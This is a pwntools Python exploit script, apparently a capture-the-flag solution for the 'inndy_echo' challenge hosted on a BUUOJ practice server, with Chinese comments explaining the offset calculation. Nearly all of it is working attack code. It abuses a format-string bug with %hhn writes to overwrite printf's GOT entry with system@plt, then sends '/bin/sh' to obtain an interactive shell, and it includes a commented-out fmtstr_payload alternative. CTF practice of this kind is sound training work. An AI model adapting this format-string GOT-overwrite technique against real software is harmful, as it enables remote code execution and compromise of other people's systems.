from pwn import *

r = remote('node5.buuoj.cn', 25967)
# r = process('./inndy_echo')
elf = ELF('inndy_echo')
context.log_level = 'debug'

printf_got = elf.got['printf']
system_plt = elf.plt['system']

print(f"printf@got: {hex(printf_got)}")  # 0x804a010
print(f"system@plt: {hex(system_plt)}")  # 0x8048400

# 找到偏移位置为7
# payload = b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'  # 偏移为7
# r.sendline(payload)
# r.interactive()

''' ===================== 方法1（64位下的fmtstr_payload函数，有时会因为\x00截断不管用） ===================='''
# 利用fmtstr_payload将printf@got改为system@plt
# payload = fmtstr_payload(7, {printf_got: system_plt})
# r.sendline(payload)
# r.sendline(b'/bin/sh\x00')
# r.interactive()

''' ===================== 方法2 ===================='''
# 按照i386小端序的规则将printf@got的地址修为为system@plt
# 举例：假设要修改为 0x08048410 ===>> \x10\x84\x04\x08
# 利用%7$hhn来写入一字节; %100x输出100的十六进制 (或者用%100c输出100个长度的字符)
# 偏移7：payload2第一段加起来是16字节, 所以不需要过多填充
# 偏移8：16+116=132，132转成16进制就是0x84
# 偏移9：132+128=260, 260转成16进制就是0x104，取一字节0x04
# 偏移10：260+260=520, 520转成16进制就是0x208，取一字节0x08
# 但是！不能这样写，因为第一个位置填充\x00，而payload2第一段加起来是16字节了，无法满足\x00
# payload2 = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
# payload2 += b'%7$hhn' + b'%116x%8$hnn' + b'%128x%9$hhn' + b'%260x%10$hhn'

# 预设好一段payload的长度固定为0x30=48, 那么第一个需要填充的相对偏移就是48/4=12，加上原来的偏移7就是19
# system@plt ===>> 0x08048400 ===>> \x00\x84\x04\x08
payload2 = b'%19$hhn' + b'%132x%20$hhn' + b'%128x%21$hhn' + b'%260x%22$hhn'
payload2 = payload2.ljust(0x30, b'a')
payload2 += p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
r.sendline(payload2)
r.sendline(b'/bin/sh\x00')
r.interactive()
